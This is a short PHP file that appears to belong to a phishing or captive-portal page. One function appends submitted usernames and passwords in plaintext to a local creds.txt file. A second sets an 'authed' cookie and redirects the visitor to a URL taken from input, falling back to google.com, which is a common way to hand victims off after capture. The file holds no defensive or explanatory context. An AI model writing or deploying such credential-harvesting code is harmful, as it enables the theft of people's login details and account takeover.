<?php

function log_credentials(string $type, string $user, string $pass) {
    $entry = sprintf("%s | user=%s | pass=%s%s", $type, $user, $pass, PHP_EOL);
    file_put_contents(__DIR__ . '/creds.txt', $entry, FILE_APPEND | LOCK_EX);
}


function helper_redirect(?string $url) {
    setcookie('custom_portal_authed', '1', time() + 3600, '/');

    if (!empty($url)) {
        $target = filter_var(urldecode($url), FILTER_SANITIZE_URL);
        header("Location: " . $target);
        exit;
    }

    header("Location: http://www.google.com/");
    exit;
}
?>
